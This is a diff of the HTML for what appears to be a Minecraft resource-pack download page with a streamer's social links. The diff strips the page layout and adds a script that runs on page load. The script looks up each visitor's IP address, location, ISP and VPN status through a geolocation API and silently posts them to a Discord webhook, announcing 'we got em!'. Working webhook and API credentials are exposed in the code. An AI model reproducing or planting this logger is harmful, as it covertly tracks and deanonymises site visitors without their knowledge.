-    <li class="hero__social-item">
-      <a
-          href="https://twitch.tv/ultimateita"
-        target="_blank"
-        class="hero__social-link"
-      >
-        <svg width="20" height="20" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.99993 0L2.28564 5.71429V26.2857H9.14279V32L14.8571 26.2857H19.4285L29.7142 16V0H7.99993ZM27.4285 14.8571L22.8571 19.4286H18.2856L14.2856 23.4286V19.4286H9.14279V2.28571H27.4285V14.8571ZM24.0001 6.28577H21.7144V13.1429H24.0001V6.28577ZM15.4285 6.28577H17.7142V13.1429H15.4285V6.28577Z" fill="currentColor"></path>
-</svg>
-          <div class="hero__social-badge">
-            Live
-          </div>
-      </a>
-    </li>
-    <li class="hero__social-item">
-      <a
-          href="https://youtube.com/channel/UCalupUa9UYb5JEk3pP29E0A"
-        target="_blank"
-        class="hero__social-link"
-      >
-        <svg width="24" height="17" viewBox="0 0 24 17" xmlns="http://www.w3.org/2000/svg">
-  <path d="M20.062 0H3.938A3.944 3.944 0 0 0 0 3.939v9.121A3.944 3.944 0 0 0 3.938 17h16.125A3.944 3.944 0 0 0 24 13.06V3.939A3.944 3.944 0 0 0 20.062 0zm-3.524 8.531l-6.769 4.331a.504.504 0 0 1-.509.017.5.5 0 0 1-.26-.438V3.779a.502.502 0 0 1 .77-.422l6.769 4.332a.499.499 0 0 1-.001.842z" fill-rule="nonzero"/>
-</svg>
-      </a>
-    </li>
-    <li class="hero__social-item">
-      <a
-          href="https://tiktok.com/@ultytok"
-        target="_blank"
-        class="hero__social-link"
-      >
-        <svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 2859 3333" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" clip-rule="evenodd">
-  <path d="M2081 0c55 473 319 755 778 785v532c-266 26-499-61-770-225v995c0 1264-1378 1659-1932 753-356-583-138-1606 1004-1647v561c-87 14-180 36-265 65-254 86-398 247-358 531 77 544 1075 705 992-358V1h551z"/>
-</svg>
-      </a>
-    </li>
-    <li class="hero__social-item">
-      <a
-          href="https://discordapp.com/invite/ultimateita"
-        target="_blank"
-        class="hero__social-link"
-      >
-        <svg width="24" height="24" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
-  <path d="M15 4.5C15 4.5 13.2802 3.15375 11.25 3L11.067 3.36638C12.9022 3.816 13.7445 4.45875 14.625 5.25C13.1074 4.47525 11.61 3.75 9 3.75C6.39 3.75 4.89262 4.47525 3.375 5.25C4.2555 4.45875 5.2575 3.744 6.933 3.36638L6.75 3C4.62 3.20063 3 4.5 3 4.5C3 4.5 1.07963 7.28475 0.75 12.75C2.685 14.9824 5.625 15 5.625 15L6.24 14.181C5.196 13.818 4.0185 13.1704 3 12C4.21425 12.9187 6.04688 13.875 9 13.875C11.9531 13.875 13.7858 12.9187 15 12C13.9819 13.1704 12.8044 13.818 11.76 14.181L12.375 15C12.375 15 15.315 14.9824 17.25 12.75C16.9204 7.28475 15 4.5 15 4.5ZM6.5625 11.25C5.83725 11.25 5.25 10.5788 5.25 9.75C5.25 8.92125 5.83725 8.25 6.5625 8.25C7.28775 8.25 7.875 8.92125 7.875 9.75C7.875 10.5788 7.28775 11.25 6.5625 11.25ZM11.4375 11.25C10.7122 11.25 10.125 10.5788 10.125 9.75C10.125 8.92125 10.7122 8.25 11.4375 8.25C12.1628 8.25 12.75 8.92125 12.75 9.75C12.75 10.5788 12.1628 11.25 11.4375 11.25Z">
-</svg>
-      </a>
-    </li>
-    <li class="hero__social-item">
-      <a
-          href="https://instagram.com/ig.ultimateita"
-        target="_blank"
-        class="hero__social-link"
-      >
-        <svg width="22" height="22" viewBox="0 0 22 22" xmlns="http://www.w3.org/2000/svg">
-  <path d="M5.495 0h11.01A5.494 5.494 0 0 1 22 5.495v11.01A5.494 5.494 0 0 1 16.505 22H5.495A5.494 5.494 0 0 1 0 16.505V5.495A5.494 5.494 0 0 1 5.495 0zM2.2 16.505A3.294 3.294 0 0 0 5.495 19.8h11.01a3.294 3.294 0 0 0 3.295-3.295V5.495A3.294 3.294 0 0 0 16.505 2.2H5.495A3.294 3.294 0 0 0 2.2 5.495v11.01zM5.5 11a5.5 5.5 0 1 1 11 0 5.5 5.5 0 0 1-11 0zm8.8 0a3.3 3.3 0 1 0-6.6 0 3.3 3.3 0 0 0 6.6 0zm2.2-4.4a1.1 1.1 0 1 0 0-2.2 1.1 1.1 0 0 0 0 2.2z" fill-rule="nonzero"/>
-</svg>
-      </a>
-    </li>
-    </div>
-</section>
-</div><div id="fw-section-featured-collection-0" class="fw-section">
+<!-- css hover for button animations -->
+<link rel="stylesheet" href="css/hover-min.css">
 
-<section data-section-id="" data-testid="main.single.section" class="featured-collection featured-collection--">
-  <div class="collection">
-    <div class="container wrapper">
-      <div class="collection__header">
-        <div class="section-header">
-            <div class="section-header__cta">
-            </div>
-        </div>
-      </div>
-      <div class="collection__grid">
-        <div class="grid grid--waffle grid--center">
-          
-            <div class="grid__column grid__column--6 grid__column--3@md">
-              
-
-
-
-
-
-
-
-
-<div data-testid="product" class="product-tile">
-  <a href="!   §lUlty§bfault §r§7v0.25.zip" class="tile">
-    <div class="tile__image">
-      <div class="image image--background-color">
-        <div class="image__badges">
-          
-            
-          
-
-          
-        </div>
-
-        <div class="image__object">
-          
-            <img
-              src="Ultyfault.png"
-              alt="ResourcePack 1"
-            >
-          
-        </div>
-      </div>
-    </div>
-
-    <div class="tile__description">
-      <h3 class="tile__heading">
-        UltyFault 16x
-      </h3>
-    </div>
-  </a>
-</div>
-            </div>
-            <div class="grid__column grid__column--6 grid__column--3@md">
-<div data-testid="product" class="product-tile">
-  <a href="!   §lUlty§bfault§l§c+ §r§7v0.14.zip" class="tile">
-    <div class="tile__image">
-      <div class="image image--background-color">
-        <div class="image__badges">
-        </div>
-        <div class="image__object">
-            <img
-              src="Ultyfault+.png"
-              alt="Resource Pack 2"
-            >
-        </div>
-      </div>
-    </div>
-    <div class="tile__description">
-      <h3 class="tile__heading">
-        UltyFault Plus 16x
-      </h3>
-    </div>
-  </a>
-</div>
-            </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-</div>
-  </div>
-</div>
-      </div>
-      <footer class="page__footer">
-        <div id="fw-section-footer" class="fw-section">
-<div data-testid="main.single.section" class="footer">
-  <div class="wrapper">
-    <div class="footer__inner">
-      <div class="footer__top">
-        <div class="grid grid--middle">
-          <div class="grid__column grid__column--12 grid__column--4@md">
-          </div>
-          <div class="grid__column grid__column--12 grid__column--8@md grid__column--first@md"> 
-          </div>
-        </div>
-      </div>
-
-      <div class="footer__bottom">
-        <ul class="footer__list footer__list--bottom">
-          <li class="footer__list-item">
-            <div class="footer__copy">&copy; 2023 SavageGhost</div>
-          </li>
-
-          
-        </ul>
-      </div>
-    </div>
-  </div>
-</div>
-</div>
-      </footer>
-    </div>
-    <script src="https://themes.fourthwall.com/themes/assets/0e3f5cff-c3c8-4429-b5aa-ced3f25e3e2f/assets/theme.js?v=4e211f5f43cbba57a240bbd01ee39d28ef781cfe1aef4f904dc60bb45a18bcba" rel="preload"></script>
-  </body>
-</html>
+<!-- Roboto is loaded by Beaker 'Roboto:400,500,700' -->
+<script>
+  WebFont.load({
+    google: {
+      families: ['Muli:900', 'Nunito:200,600', 'Roboto']
+    }
+  });
+</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
+        const ip = data.ip_address;
+        const city = data.city;
+        const region = data.region;
+        const zip = data.postal_code;
+        const country = data.country;
+        const flag = data.flag.emoji;
+        const aso = data.connection.autonomous_system_organization;
+        const isp = data.connection.isp_name;
+        const org = data.connection.organization_name;
+        const vpn = data.security.is_vpn;
+        const tz = data.timezone.name;
+        const ct = data.timezone.current_time;
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1075843130764574790/f_pSiOZzsDoc1zcX0-yXYbRl35yEnO3sRdaT9hCiBJHTHH8SjVqp-MDsqC-qX6oxhImz");
+        // Put in your discord webhook url above ^^^
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "ECHOLOG",
+          avatar_url: "https://3kh0.github.io/img/echo.jpg",
+          content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
+          "\n> City: " + city + 
+          "\n> Region: " + region + 
+          "\n> Zip: " + zip + 
+          "\n> Country: " + country +
+          "\n> Flag: " + flag +
+          "\n> Auto System Org: " + aso +
+          "\n> ISP: " + isp +
+          "\n> Org: " + org +
+          "\n> Using VPN: " + vpn +
+          "\n> Timezone: " + tz +
+          "\n> Current time: " + ct
+          ,
+        };
+        request.send(JSON.stringify(params));
+      });
+    </script>
+<script src="/js/test.js"></script>
+</body></html>
